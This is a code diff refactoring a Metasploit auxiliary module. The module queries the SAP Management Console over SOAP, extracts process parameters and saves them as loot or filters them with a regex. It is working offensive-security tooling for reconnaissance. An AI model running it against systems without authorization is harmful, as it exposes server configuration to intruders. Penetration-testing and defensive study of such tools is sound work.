@@ -30,7 +30,7 @@ class Metasploit4 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(50013),
-        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
+        OptString.new('TARGETURI', [false, 'Path to the SAP Management Console ', '/']),
         OptString.new('MATCH', [false, 'Display matches e.g login/', '']),
       ], self.class)
     register_autofilter_ports([ 50013 ])
@@ -38,16 +38,6 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    res = send_request_cgi({
-      'uri'      => normalize_uri(datastore['URI']),
-      'method'   => 'GET'
-    }, 25)
-
-    if not res
-      print_error("#{rhost}:#{rport} [SAP] Unable to connect")
-      return
-    end
-
     getprocparam(ip)
   end
 
@@ -75,7 +65,7 @@ class Metasploit4 < Msf::Auxiliary
 
     begin
       res = send_request_raw({
-        'uri'      => normalize_uri(datastore['URI']),
+        'uri'      => normalize_uri(target_uri.path),
         'method'   => 'POST',
         'data'     => data,
         'headers'  =>
@@ -84,9 +74,9 @@ class Metasploit4 < Msf::Auxiliary
             'SOAPAction'     => '""',
             'Content-Type'   => 'text/xml; charset=UTF-8',
           }
-      }, 30)
+      })
 
-      if not res
+      unless res
         print_error("#{rhost}:#{rport} [SAP] Unable to connect")
         return
       end
@@ -100,7 +90,7 @@ class Metasploit4 < Msf::Auxiliary
           body = res.body
           success = true
         end
-      elsif res.code == 500
+      elsif res
         case res.body
         when /<faultstring>(.*)<\/faultstring>/i
           faultcode = $1.strip
@@ -116,16 +106,16 @@ class Metasploit4 < Msf::Auxiliary
     end
 
     if success
-      #Only stoor loot if MATCH is not selected
-      if datastore['MATCH'].empty?
-        print_good("#{rhost}:#{rport} [SAP] Process Parameters: Entries extracted to loot")
-        store_loot(
+      # Only store loot if MATCH is not selected
+      if datastore['MATCH'].blank?
+        loot = store_loot(
           "sap.getprocessparameters",
           "text/xml",
           rhost,
           res.body,
           ".xml"
         )
+        print_good("#{rhost}:#{rport} [SAP] Process Parameters: Entries extracted to #{loot}")
       else
         name_match = Regexp.new(datastore['MATCH'], [Regexp::EXTENDED, 'n'])
         print_status("[SAP] Regex match selected, skipping loot storage")
